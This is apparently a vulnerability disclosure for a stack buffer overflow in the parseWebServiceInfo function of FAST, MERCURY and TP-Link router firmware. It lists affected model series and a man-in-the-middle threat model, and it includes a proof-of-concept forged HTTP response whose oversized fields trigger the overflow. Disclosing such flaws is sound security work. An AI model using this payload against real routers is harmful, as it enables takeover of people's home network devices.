# parseWebServiceInfo Vulnerability Report

FAST,MERCURY and TP-Link routers have a stack overflow issue in `parseWebServiceInfo` function.

Local users could get remote code execution, this vulnerability currently affects three types of routers:

- FAST: FW, FAC, FR series (e.g., FW325R, FR100P-AC, FAC1900R, FAC1200R)
- MERCURY: D, M, MW series (e.g., M6G, D196G, MW310R, MW351R, D121G)
- TP-Link: WDR, WR, R, WA series (e.g., TL-WDR7660, TL-WDR7650, TL-WA933RE)

It affects the linux system and vxworks system. we believe there are much more models suffered from this vuln.

## Vulnerability Description

**Threat model**: An attacker can intercept the traffic between router and Intenet. That is, an attacker can perform a man-in-the-middle attack on the router.

This vulnerability happen when `parseWebServiceInfo`  handle data from cloud server by using `strncpy`.

1. Attackers intercept the response from cloud server.
2. Then attackers send a malicious response to the router. The `GetMiscInfoResult` , `ClientIP` , `UserType` fields in this malicious response are filled a long string.
3. `parseWebServiceInfo`  get these fileds by using `strstr`. However, the length is not checked.
4. Finally, whole string of these fields are copyed to the stack by `strncpy` and lead to a stack buffer overflow to execute arbitrary code.
- sink point 1（`GetMiscInfoResult`  field）:

![1](photos/1.png)
   
- sink point 2（`ClientIP` field）:

![2](photos/2.png)  
    
- sink point 3（`UserType`field）:

![3](photos/3.png)    
    
    

## PoC

```
HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
Content-Length: 200
Connection: close
Cache-control: no-cache

<GetMiscInfoResult>1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</GetMiscInfoResult>
<ClientIP>1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</ClientIP>
<UserType>1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</UserType>
```
